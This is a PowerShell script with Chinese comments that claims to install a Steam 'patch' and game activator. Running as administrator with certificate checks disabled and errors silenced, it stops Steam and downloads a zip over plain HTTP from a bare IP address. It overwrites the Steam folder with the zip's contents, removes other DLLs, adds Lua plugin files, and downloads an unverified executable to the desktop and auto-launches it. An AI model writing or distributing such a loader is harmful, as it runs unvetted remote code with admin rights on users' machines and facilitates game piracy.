#Requires -RunAsAdministrator
chcp 65001 > $null
$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'

# ========== 全局TLS兼容 ==========
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls12
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# ========== 配置区 ==========
$ZipUrl = "http://47.100.104.45/files/patch.zip"
$ActivatorUrl = "http://47.100.104.45/files/游戏激活程序.exe"
$TempZip = "$env:TEMP\steam_patch.zip"
$TempUnzip = "$env:TEMP\steam_patch_temp"
$Desktop = [Environment]::GetFolderPath("Desktop")
$ActivatorExeName = "游戏激活程序.exe"
# ============================

# ===== 补丁安装逻辑 =====
$SteamRoot = $null
if(Test-Path "HKCU:\Software\Valve\Steam"){
    $regInfo = Get-ItemProperty "HKCU:\Software\Valve\Steam"
    if($regInfo.SteamPath -and (Test-Path "$($regInfo.SteamPath)\steam.exe")){
        $SteamRoot = $regInfo.SteamPath.TrimEnd('\')
    }
}
if(-not $SteamRoot){
    if(Test-Path "HKLM:\SOFTWARE\Wow6432Node\Valve\Steam"){
        $regInfo = Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Valve\Steam"
        if($regInfo.InstallPath -and (Test-Path "$($regInfo.InstallPath)\steam.exe")){
            $SteamRoot = $regInfo.InstallPath.TrimEnd('\')
        }
    }
}
if(-not $SteamRoot){
    $diskArr = @("C:","D:","E:","F:")
    foreach($disk in $diskArr){
        $path1 = "$disk\Program Files (x86)\Steam"
        if(Test-Path "$path1\steam.exe"){
            $SteamRoot = $path1
            break
        }
        $path2 = "$disk\Steam"
        if(Test-Path "$path2\steam.exe"){
            $SteamRoot = $path2
            break
        }
    }
}
if(-not $SteamRoot){
    $steamProc = Get-Process steam -ErrorAction SilentlyContinue
    if($steamProc){
        $exePath = $steamProc[0].Path
        $SteamRoot = Split-Path $exePath -Parent
    }
}
if(-not $SteamRoot -or -not (Test-Path "$SteamRoot\steam.exe")){
    Write-Host "`n❌ ERROR: Cannot locate Steam folder" -ForegroundColor Red
    Start-Sleep 5
    exit 1
}

# ========== 停止 Steam 进程 ==========
Get-Process steam,steamwebhelper,steamerrorreporter -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 3
# =========================================================================

try{
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($ZipUrl,$TempZip)
}catch{
    Write-Host "`n❌ ERROR: Patch download failed" -ForegroundColor Red
    Start-Sleep 5
    exit 1
}

if(Test-Path $TempUnzip){Remove-Item $TempUnzip -Recurse -Force}
New-Item $TempUnzip -ItemType Directory -Force | Out-Null
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($TempZip,$TempUnzip)

robocopy "$TempUnzip" "$SteamRoot" /E /IS /R:0 /W:0 /NP /NFL /NDL > $null 2>&1

# ===== 去掉删除 steam.cfg 的逻辑，增加删除 sdko.dll =====
$hidFullPath = Join-Path $SteamRoot "hid.dll"
if (Test-Path $hidFullPath) { Remove-Item -Path $hidFullPath -Force -ErrorAction SilentlyContinue }

$verFullPath = Join-Path $SteamRoot "version.dll"
if (Test-Path $verFullPath) { Remove-Item -Path $verFullPath -Force -ErrorAction SilentlyContinue }

$sdkoFullPath = Join-Path $SteamRoot "sdko.dll"
if (Test-Path $sdkoFullPath) { Remove-Item -Path $sdkoFullPath -Force -ErrorAction SilentlyContinue }
# =========================================================================

# ===== 迁移 config\lua 文件到 config\stplug-in =====
$LuaSourceDir = Join-Path $SteamRoot "config\lua"
$StplugInDir  = Join-Path $SteamRoot "config\stplug-in"

if (Test-Path $LuaSourceDir) {
    # 如果 stplug-in 不存在，自动创建
    if (-not (Test-Path $StplugInDir)) {
        New-Item -Path $StplugInDir -ItemType Directory -Force | Out-Null
        # 已移除提示：Write-Host "✅ 已创建 stplug-in 文件夹" -ForegroundColor Green
    }

    # 复制 lua 文件夹内所有文件到 stplug-in（保留 lua 原文件不变）
    Get-ChildItem -Path $LuaSourceDir -File -ErrorAction SilentlyContinue | ForEach-Object {
        Copy-Item -Path $_.FullName -Destination (Join-Path $StplugInDir $_.Name) -Force -ErrorAction SilentlyContinue
    }

    # 同时复制 lua 下的子文件夹（如存在），保持目录结构
    Get-ChildItem -Path $LuaSourceDir -Directory -ErrorAction SilentlyContinue | ForEach-Object {
        Copy-Item -Path $_.FullName -Destination $StplugInDir -Recurse -Force -ErrorAction SilentlyContinue
    }

    # 已移除提示：Write-Host "✅ 已将 config\lua 内容复制到 config\stplug-in" -ForegroundColor Green
} else {
    Write-Host "⚠️ 未找到 config\lua 文件夹，跳过迁移" -ForegroundColor Yellow
}
# =========================================================================

Remove-Item $TempZip -Force
Remove-Item $TempUnzip -Recurse -Force

Write-Host "`n=====================================" -ForegroundColor Cyan
Write-Host "✅ SUCCESS: All patches installed" -ForegroundColor Green
Write-Host "=====================================`n" -ForegroundColor Cyan

# ========== 下载最新版激活程序到桌面 ==========
$activatorExePath = Join-Path $Desktop $ActivatorExeName
try {
    $webClient.DownloadFile($ActivatorUrl, $activatorExePath)
    Write-Host "✅ 游戏激活程序.exe 已成功下载到桌面" -ForegroundColor Green
} catch {
    try {
        Invoke-WebRequest -Uri $ActivatorUrl -OutFile $activatorExePath -UseBasicParsing -ErrorAction Stop
    } catch {
        Write-Host "❌ ERROR: 激活工具下载失败，请检查网络。" -ForegroundColor Red
        Start-Sleep 3
    }
}

# ========== 恢复自动启动 Steam 并等待主界面 ==========
if (-not (Get-Process -Name "steam" -ErrorAction SilentlyContinue)) {
    Start-Process "$SteamRoot\steam.exe"
}

$waitCounter = 0
while ($waitCounter -lt 30) {
    $winTitle = (Get-Process steam -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle } | Select-Object -First 1).MainWindowTitle
    if ($winTitle -match "库|商店|Library|Store|社区|Community") {
        break
    }
    Start-Sleep -Milliseconds 500
    $waitCounter++
}
Start-Sleep -Seconds 2

# ========== 自动弹出激活程序 ==========
if (Test-Path $activatorExePath) {
    Start-Process $activatorExePath
} else {
    Write-Host "⚠️ WARNING: 激活工具不存在，请检查桌面" -ForegroundColor Yellow
}

Start-Sleep -Seconds 3
exit 0
